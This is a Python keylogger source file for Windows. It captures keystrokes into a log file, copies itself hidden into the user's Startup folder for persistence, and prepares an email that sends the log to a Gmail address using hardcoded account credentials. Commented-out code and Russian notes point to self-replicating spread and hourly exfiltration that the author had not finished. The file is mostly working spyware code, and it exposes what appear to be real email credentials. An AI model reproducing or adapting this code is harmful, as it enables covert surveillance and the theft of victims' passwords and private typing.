#!/usr/bin/python3

try:
    import schedule
    from pynput import keyboard
    import win32con, win32api
    import smtplib
    import email
    import email.mime.application
    from email.mime.multipart import MIMEMultipart
    from pynput.keyboard import Key, Listener
    import os,   sys, time, uuid
except ModuleNotFoundError:
    from subprocess import call
    packets = ["pynput", "smtplib", "email", "schedule", "win32con", "win32api"]
    call("pip install" + ' '.join(packets), shell=True)
finally:

    EMAIL_ADDR = "cnxnd11@gmail.com"
    PASSWD = "moejmdsbakpxsmmt"

    pressedkeys = []

    msg = MIMEMultipart()

    msg['Subject'] = 'Keylog Data'
    msg['From'] = 'cnxnd11@gmail.com'
    msg['To'] = 'snesrienko@gmail.com'

    filename = 'log.log'
    fp = open(filename, 'rb')
    att = email.mime.application.MIMEApplication(fp.read(), _subtype="log")
    fp.close()
    att.add_header('Content-Disposition', 'attachment', filename=filename)

    msg.attach(att)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(EMAIL_ADDR, PASSWD)

    def on_press(key):
        try:
            pressedkeys.append(key.char)
        except AttributeError:
            pressedkeys.append(f" {key} ")

        writeToFile(pressedkeys)

    def writeToFile(pressedkeys):
        with open("log.log", "w") as file:
            for keybKey in pressedkeys:
                cleankey = str(keybKey).replace("'" and "Key", "")
                file.write(cleankey)

    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    def startup():
        keylogger = sys.argv[0]
        keylogger_name = os.path.basename(keylogger)
        user_path = os.path.expanduser('~')
        if not os.path.exists(
                f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}"):
            os.system(
                f'copy "{keylogger}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
        win32api.SetFileAttributes(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}", win32con.FILE_ATTRIBUTE_HIDDEN)
    # подумай над shedule каждый час отправлять данные

    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    listener.start()

    # with open(sys.argv[0]) as file:
    #     self_content = file.read()
    #     # while True:
    #     for i in range(1):
    #         # wait 3 seconds
    #         time.sleep(3)
    #
    #         # create unique filename
    #         dupe = "%s.py" % uuid.uuid4()
    #
    #         # open and write to the copy
    #         copy = open(dupe, "w")
    #         copy.write(self_content)
    #         copy.close()
    #
    #         # make the copy executable and execute
    #         # os.chmod(dupe, "0777"))
    #         os.system("./%s &" % dupe) #доделать расспространение

    def invisibility():
        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_HIDDEN)#поиграйся с атрибутами потому что при хиден не хочет копироваться в атозагрузку

    def visibility(): # DELETE BEFORE PUSHING
        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_NORMAL)
    if __name__ == '__main__':
          startup()
        # invisibility()
        # visibility()
        # server.sendmail('cnxnd11@gmail.com', ['cnxnd11@gmail.com'], msg.as_string())
        # server.quit()
